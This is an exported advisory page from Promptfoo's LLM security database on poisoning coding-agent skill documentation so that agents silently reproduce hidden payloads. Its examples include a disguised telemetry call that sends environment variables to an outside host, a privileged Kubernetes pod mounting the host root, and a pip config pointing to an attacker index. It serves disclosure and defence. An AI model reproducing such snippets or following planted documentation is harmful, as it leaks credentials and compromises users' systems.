---
sourceFile: "Agent Implicit Doc Execution | LLM Security Database - Promptfoo"
exportedBy: "Kortex"
exportDate: "2026-06-26T04:27:51.055Z"
---

# Agent Implicit Doc Execution | LLM Security Database - Promptfoo

a66cbbc6-c039-40f0-85e9-158543103497

Agent Implicit Doc Execution | LLM Security Database - Promptfoo

2ab353f3-2e7c-49ba-87ac-b968d5dd7298

https://www.promptfoo.dev/lm-security-db/vuln/agent-implicit-doc-execution-d1a04ec1

Agent Implicit Doc Execution | LLM Security Database

Back to Vulnerability List

https://www.promptfoo.dev/lm-security-db

LMVD-ID: d1a04ec1

Published March 31, 2026

Agent Implicit Doc Execution

application-layer

https://www.promptfoo.dev/lm-security-db/tag/application-layer

prompt-layer

https://www.promptfoo.dev/lm-security-db/tag/prompt-layer

https://www.promptfoo.dev/lm-security-db/tag/injection

https://www.promptfoo.dev/lm-security-db/tag/jailbreak

https://www.promptfoo.dev/lm-security-db/tag/rag

https://www.promptfoo.dev/lm-security-db/tag/blackbox

https://www.promptfoo.dev/lm-security-db/tag/agent

https://www.promptfoo.dev/lm-security-db/tag/chain

data-security

https://www.promptfoo.dev/lm-security-db/tag/data-security

https://www.promptfoo.dev/lm-security-db/tag/integrity

https://www.promptfoo.dev/lm-security-db/tag/safety

Affected Models: GPT-5, Claude 4, Gemini 2

Research Paper

Supply-Chain Poisoning Attacks Against LLM Coding Agent Skill Ecosystems

https://arxiv.org/abs/2604.03081

#### Description:

LLM-based coding agents are vulnerable to Document-Driven Implicit Payload Execution (DDIPE) via supply-chain poisoning of third-party agent skills. Attackers can embed malicious logic directly into legitimate-looking code examples and configuration templates within skill documentation files (e.g.,

). Because coding agents ingest this metadata into their context windows and treat the documentation as an authoritative reference, the underlying LLM silently reproduces and executes the embedded payload during routine task completion. This implicit execution bypasses both model-level safety alignment (which looks for imperative malicious instructions) and framework-level architectural guardrails, hijacking the agent's system-level action space (file I/O, shell commands, network requests) without requiring explicitly malicious user prompts.

#### Code Example Poisoning (Data Exfiltration):

An attacker publishes a PDF-processing skill where the official

contains a Python example for

process\_pdf(file\_path)

. The example includes

env\_data = dict(os.environ)

and a disguised telemetry request

req("https://api.internal-log.com", data=env\_data)

wrapped in a

try/except: pass

block. When the agent uses the skill, it copies the reference implementation, silently exfiltrating host credentials.

#### Config Template Poisoning (Privilege Escalation):

A skill documenting Kubernetes pod creation includes a YAML template with

securityContext: privileged: true

volumeMounts: - name: host-root, mountPath: /host

. When the agent is tasked with creating a pod, it applies the backdoored configuration verbatim, granting unauthorized host access.

#### Sandbox Semantic Bypass (Infrastructure Poisoning):

An adversarial skill embeds a 479-byte pip configuration script that writes an

extra-index-url

pointing to an attacker-controlled repository into the workspace

. The agent reproduces this file, which bypasses standard path sandboxing since

is a legitimate workspace artifact, silently poisoning all subsequent package installations.

Successful exploitation allows an external attacker to achieve system control, Remote Code Execution (RCE), and persistent infrastructure compromise. Specifically, the vulnerability enables unauthorized read/write file operations, silent exfiltration of environment variables and configuration secrets, and the generation of backdoored Infrastructure-as-Code (IaC) files (e.g., tampered package manager configs, Ansible playbooks) that can propagate to production via automated CI/CD pipelines.

#### Affected Systems:

LLM-based coding agents that retrieve and execute third-party agent skills or rely on repository-provided documentation for tool-invocation workflows. Confirmed vulnerable systems include:

Claude Code

Gemini CLI (specifically amplified in headless/CI environments where the

flag, non-TTY stdin, or

bypasses execution confirmation).

#### Mitigation Steps:

#### Prompt-Level Trust Boundaries:

Inject mandatory security warnings into the agent's system message template explicitly marking all retrieved skill documentation and repository-provided content as untrusted (e.g., deployed in OpenHands PR #2XX5).

#### Semantic Permission Scoping:

Disable default auto-trust of workspace folders in headless or CI/CD modes. Require strict, intent-based confirmation prompts for specific high-risk system interfaces (

run\_shell\_command

) when triggered by logic derived from external skills.

#### Multi-Model Verification:

Deploy heterogeneous models for execution-decision ensemble voting. (Research demonstrates that single-model execution rates of up to 27.1% drop to a 1.6% joint-bypass rate across diverse LLMs due to model-specific alignment blind spots).

#### Intent-Level Semantic Auditing:

Do not rely solely on syntactic sandbox boundaries (e.g., filesystem paths) or lexical keyword filters. Implement strict configuration anomaly scanning (e.g., detecting unauthorized registry URLs in generated

files) before permitting action-space execution.

Previous: Agent Skill Injection

https://www.promptfoo.dev/lm-security-db/vuln/agent-skill-injection-f8a882fc

Next: Agent Goal Reframing Exploit

https://www.promptfoo.dev/lm-security-db/vuln/agent-goal-reframing-exploit-d12de611

https://www.promptfoo.dev/

. All rights reserved.

